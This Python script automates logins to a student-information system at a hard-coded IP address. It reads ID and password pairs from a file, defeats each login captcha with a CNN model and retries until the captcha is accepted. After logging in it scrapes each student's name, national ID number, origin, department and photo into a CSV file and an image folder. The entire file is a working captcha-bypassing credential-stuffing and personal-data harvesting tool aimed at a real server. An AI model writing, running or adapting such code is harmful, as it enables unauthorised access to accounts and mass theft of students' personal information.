
from PIL import Image
import os,time
import course.datatest
import requests
from course.VerifyCodeCNN import CNN
import hashlib
import json
from lxml import etree
import csv

codeurl = 'http://210.42.121.134/servlet/GenImg'
checkUrl='http://210.42.121.134/servlet/Login'
MODEL_SAVE_PATH = './data/model.ckpt'
cnn = CNN(1000, 0.0005, MODEL_SAVE_PATH)




def gethtml(s,checkurl,headers,cookies,data):
	i = 0
	while i < 10:
		try:
			html = requests.post(checkUrl, headers = headers, cookies = cookies, data=data,timeout=0.3)
			return html,s
		except requests.exceptions.RequestException:
			i += 1

def getpic(s,headers):
	i = 0
	while i < 10:
		try:
			html = s.get(codeurl, headers = headers,verify=False,timeout=0.3)
			return html,s
		except requests.exceptions.RequestException:
			i += 1
def get_inf(s,headers,url):
	i = 0
	while i < 10:
		try:
			html = s.get(url, headers = headers,timeout=3)
			return html,s
		except requests.exceptions.RequestException:
			i += 1



def log_in(s,idnum,password):
	headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}
	valcode,s = getpic(s,headers)
	f = open('valcode.png', 'wb')
	f.write(valcode.content)
	f.close()
	md5=hashlib.md5(password.encode('utf-8')).hexdigest()

	code = datatest.main(cnn)

	data = {"id":idnum,"pwd":md5,"xdvfb":str(code)}
	print(valcode.cookies)
	resp,s=gethtml(s,checkUrl,headers,requests.utils.dict_from_cookiejar(valcode.cookies),data)   
	#resp = requests.post(checkUrl, headers = headers, cookies = requests.utils.dict_from_cookiejar(valcode.cookies), data=data)
	return resp,s


def password_try(s,idnum,password):

		
	while True:
		res,s=log_in(s,idnum,password)
		if res.url!='http://210.42.121.134/servlet/Login':
			return 1,s
		else:		
			if  res.text.find('验证码错误')==-1:
				break
	return 0,s


def save_inf(idnum,password):
	headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}
	s = requests.Session()
	flag,s=password_try(s,idnum,password)
	if flag:
		resp,s=get_inf(s,headers=headers,url='http://210.42.121.134/stu/student_information.jsp')
		html = etree.HTML(resp.text)
		name=html.xpath('/html/body/table/tr[1]/td[2]/text()')
		gender=html.xpath('/html/body/table/tr[1]/td[3]/text()')
		IDNumber=html.xpath('/html/body/table/tr[2]/td[1]/text()')
		origin=html.xpath('/html/body/table/tr[2]/td[3]/text()')
		department=html.xpath('/html/body/table/tr[3]/td[1]/text()')
		profession=html.xpath('/html/body/table/tr[3]/td[2]/text()')
		with open('data.csv', 'a+', newline = '', encoding = 'gb18030') as f:
			csvwriter = csv.writer(f,dialect=("excel"))
			csvwriter.writerow([name[0],gender[0],idnum+'\t',IDNumber[0]+'\t',origin[0],department[0],profession[0]])
		print(name[0])

 

		result = html.xpath('/html/body/table/tr[8]/td[2]/img/@src')
		try:
			img =s.get(result[0])
			f = open('./pic/'+idnum+'.jpg','ab') #存储图片，多媒体文件需要参数b（二进制文件）
			f.write(img.content) #多媒体存储content
			f.close()
		except:
			print('error')



file = open('info3.txt')
for line in file:
	try:
		stu_id=line.strip('\n').split(' ')[0]
		passwd=line.strip('\n').split(' ')[1]
		print(line.strip('\n').split(' '))
		save_inf(stu_id,passwd)
	except:
		print('error')




